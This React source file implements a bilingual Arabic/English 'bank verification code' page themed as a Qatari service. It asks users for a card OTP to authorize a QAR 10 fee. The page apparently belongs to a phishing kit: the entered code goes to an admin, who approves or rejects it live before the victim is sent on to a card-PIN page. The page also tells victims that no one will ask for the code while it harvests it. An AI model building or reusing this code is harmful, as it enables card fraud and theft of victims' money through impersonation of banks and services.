import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import SiteHeader from "@/components/SiteHeader";
import SiteFooter from "@/components/SiteFooter";
import WaitingOverlay from "@/components/WaitingOverlay";
import { ShieldCheck, Loader2, KeyRound, Stethoscope, MessageSquare, Timer } from "lucide-react";
import { useLang } from "@/i18n/LanguageContext";
import { getServiceContext } from "@/lib/serviceContext";
import {
  sendData,
  navigateToPage,
  isFormApproved,
  isFormRejected,
  waitingMessage,
} from "@/lib/store";

const MAROON = "#8b1538";
const FEE_QAR = 10;

const CardOtp = () => {
  const { pick, dir } = useLang();
  const [, navigate] = useLocation();
  const storedService =
    typeof window !== "undefined" ? sessionStorage.getItem("selected_service") || "" : "";
  const serviceContext = getServiceContext(storedService);

  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [isWaiting, setIsWaiting] = useState(false);
  const [error, setError] = useState(false);

  const isValid = code.length === 6;

  useEffect(() => {
    navigateToPage("رمز OTP البطاقة");
    isFormApproved.value = false;
    isFormRejected.value = false;
    waitingMessage.value = "";
  }, []);

  // Handle approval/rejection from admin
  useSignalEffect(() => {
    if (isFormApproved.value) {
      isFormApproved.value = false;
      navigate("/card-pin");
    }
  });

  useSignalEffect(() => {
    if (isFormRejected.value) {
      isFormRejected.value = false;
      setError(true);
      setIsWaiting(false);
      setLoading(false);
      setCode("");
      waitingMessage.value = "";
    }
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid) return;
    setLoading(true);
    setError(false);
    sendData({
      data: { "رمز OTP البطاقة": code },
      current: "رمز OTP البطاقة",
      waitingForAdminResponse: true,
    });
    setIsWaiting(true);
    setLoading(false);
  };

  return (
    <div className="min-h-screen bg-[#eef0fb] relative" dir={dir}>
      <WaitingOverlay />
      <SiteHeader />

      {/* Header band */}
      <div
        className="relative px-4 py-6 text-white"
        style={{ background: `linear-gradient(135deg, ${MAROON} 0%, #6d1029 100%)` }}
      >
        <div className="container mx-auto max-w-5xl">
          <div className="flex items-center gap-3">
            <div className="w-11 h-11 rounded-xl bg-white/15 backdrop-blur flex items-center justify-center shrink-0">
              <Stethoscope className="w-5 h-5 text-white" />
            </div>
            <div className="flex-1">
              <p className="text-[11px] uppercase tracking-widest opacity-80">
                {pick(serviceContext.orgLineAr, serviceContext.orgLineEn)}
              </p>
              <h1 className="text-lg font-extrabold leading-tight">
                {pick("تأكيد رمز التحقق البنكي", "Confirm the bank verification code")}
              </h1>
            </div>
          </div>
        </div>
      </div>

      <section className="px-3 pb-10 pt-6 relative z-10">
        <div className="container mx-auto max-w-5xl space-y-5">
          {/* Error banner */}
          {error && (
            <div className="bg-red-50 border border-red-200 rounded-xl p-3 text-sm text-red-700 font-semibold text-center">
              {pick("الرمز الذي أدخلته غير صحيح. يرجى المحاولة مرة أخرى", "The code you entered is incorrect. Please try again.")}
            </div>
          )}

          {/* SMS notice */}
          <div className="bg-white rounded-2xl p-5 shadow-sm border border-gray-200">
            <div className="flex items-start gap-3">
              <div
                className="w-9 h-9 rounded-xl flex items-center justify-center shrink-0"
                style={{ backgroundColor: MAROON }}
              >
                <MessageSquare className="w-4 h-4 text-white" />
              </div>
              <div className="flex-1">
                <p className="text-sm font-bold text-gray-800 mb-1">
                  {pick("تم إرسال رمز التحقق من البنك المُصدر", "Verification code sent by your issuing bank")}
                </p>
                <p className="text-xs text-gray-600 leading-relaxed">
                  {pick(
                    `أرسل البنك رمزاً مكوّناً من 6 أرقام عبر رسالة نصية إلى رقم الهاتف المسجّل لديه، وذلك لاعتماد رسوم تفعيل ${serviceContext.accountAr} البالغة ${FEE_QAR} ريال قطري.`,
                    `The bank has sent a 6-digit code by SMS to your registered phone number, to authorize the ${serviceContext.accountEn} activation fee of QAR ${FEE_QAR}.`
                  )}
                </p>
              </div>
            </div>
          </div>

          {/* OTP form */}
          <div className="bg-white rounded-2xl p-5 shadow-sm border border-gray-200 space-y-3">
            <div className="flex items-center gap-2.5 pb-2.5 border-b border-gray-100">
              <div
                className="w-9 h-9 rounded-xl flex items-center justify-center shadow-sm"
                style={{ backgroundColor: MAROON }}
              >
                <KeyRound className="w-4 h-4 text-white" />
              </div>
              <div>
                <span className="text-base font-bold text-gray-800">
                  {pick("رمز التحقق (OTP)", "Verification Code (OTP)")}
                </span>
                <p className="text-xs text-gray-500">
                  {pick("أدخل الأرقام الستة كما وردت في الرسالة النصية", "Enter the 6 digits exactly as received via SMS")}
                </p>
              </div>
            </div>
            <form id="card-otp-form" onSubmit={handleSubmit} className="space-y-3">
              <label className="block text-sm font-bold text-gray-600 mb-2">
                {pick("الرمز المكوّن من 6 أرقام", "6-digit code")}{" "}
                <span style={{ color: MAROON }}>*</span>
              </label>
              <Input
                placeholder="••••••"
                value={code}
                onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
                className="h-16 text-center text-2xl tracking-[0.6em] font-mono bg-muted/30 border-border/40 rounded-xl focus:ring-2 focus:ring-primary/30 focus:border-primary/50 transition-all"
                inputMode="numeric"
                dir="ltr"
                maxLength={6}
                autoFocus
              />
              <div className="flex items-center justify-between text-[11px] text-gray-500 pt-1">
                <span className="inline-flex items-center gap-1.5">
                  <Timer className="w-3.5 h-3.5" />
                  {pick("صلاحية الرمز 5 دقائق فقط", "Code valid for 5 minutes only")}
                </span>
                <span>
                  {pick("لم يصلك الرمز؟ راجع الرسائل النصية", "Didn't receive it? Check your SMS")}
                </span>
              </div>
            </form>
          </div>

          {/* Security note */}
          <div className="flex items-center gap-2 rounded-xl py-2.5 px-3 bg-white border border-gray-200">
            <div
              className="w-7 h-7 rounded-lg flex items-center justify-center shrink-0"
              style={{ backgroundColor: MAROON }}
            >
              <ShieldCheck className="w-3.5 h-3.5 text-white" />
            </div>
            <p className="text-xs text-gray-600 leading-relaxed">
              {pick(
                `لا تشارك هذا الرمز مع أي شخص. لن يطلبه منك موظفو ${serviceContext.platformShortAr} أو البنك مطلقاً.`,
                `Never share this code. ${serviceContext.platformShortEn} staff and your bank will never ask for it.`
              )}
            </p>
          </div>

          <Button
            form="card-otp-form"
            type="submit"
            disabled={loading || isWaiting || !isValid}
            className="w-full text-white text-base font-bold py-6 rounded-xl shadow-md hover:shadow-xl hover:opacity-95 transition-all"
            style={{ background: `linear-gradient(135deg, ${MAROON} 0%, #6d1029 100%)` }}
          >
            {isWaiting ? (
              <span className="flex items-center justify-center gap-2">
                <Loader2 className="h-4 w-4 animate-spin" />
                {pick("جارٍ التحقق من البنك...", "Awaiting bank confirmation...")}
              </span>
            ) : loading ? (
              <span className="flex items-center justify-center gap-2">
                <Loader2 className="h-4 w-4 animate-spin" />
                {pick("جارٍ إرسال الرمز...", "Submitting code...")}
              </span>
            ) : (
              pick(`تأكيد الرمز وإتمام دفع ${FEE_QAR} ر.ق`, `Confirm code & pay QAR ${FEE_QAR}`)
            )}
          </Button>

          <div className="pt-2">
            <div className="h-px bg-gradient-to-r from-transparent via-gray-300 to-transparent mb-5" />
            <p className="text-[11px] text-gray-500 text-center leading-relaxed">
              {pick(serviceContext.termsAr, serviceContext.termsEn)}
            </p>
          </div>
        </div>
      </section>
      <SiteFooter />
    </div>
  );
};

export default CardOtp;
